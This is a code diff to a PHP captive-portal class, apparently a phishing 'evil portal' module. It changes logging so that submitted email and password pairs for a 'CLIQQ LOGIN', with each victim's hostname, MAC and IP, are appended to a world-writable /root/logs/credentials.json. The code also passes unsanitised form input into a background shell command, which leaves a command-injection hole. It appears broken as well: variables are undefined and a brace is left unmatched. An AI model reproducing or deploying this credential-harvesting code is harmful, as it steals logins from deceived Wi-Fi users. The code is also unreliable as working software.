@@ -5,7 +5,22 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
-      if (isset($_POST['mobileNumber'])) {
+          $filePath = '/root/logs/credentials.json';
+          // Check if file exists and create it if not
+          if (!file_exists($filePath)) {
+            file_put_contents($filePath, '');
+          }
+
+          try {
+            // Change file permission to 777
+            $chmodResult = chmod($filePath, 511);
+            if (!$chmodResult) {
+              throw new \Exception("Failed to change permissions on $filePath");
+            }
+          } catch (\Exception $e) {
+            print("Error changing permissions: " . $e->getMessage());
+          }
+
           $mobileNumber = isset($_POST['mobileNumber']) ? $_POST['mobileNumber'] : 'mobileNumber';
           $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
           $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
@@ -13,7 +28,8 @@ class MyPortal extends Portal
 
           $reflector = new \ReflectionClass(get_class($this));
           $logPath = dirname($reflector->getFileName());
-          file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "mobileNumber: {$mobileNumber}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+          //file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "mobileNumber: {$mobileNumber}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+          file_put_contents("/root/logs/credentials.json", "[" . date('Y-m-d H:i:s') . "Z]\n" . "CLIQQ LOGIN\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
           $this->execBackground("notify $mobileNumber");
         }
         // handle form input or other extra things there
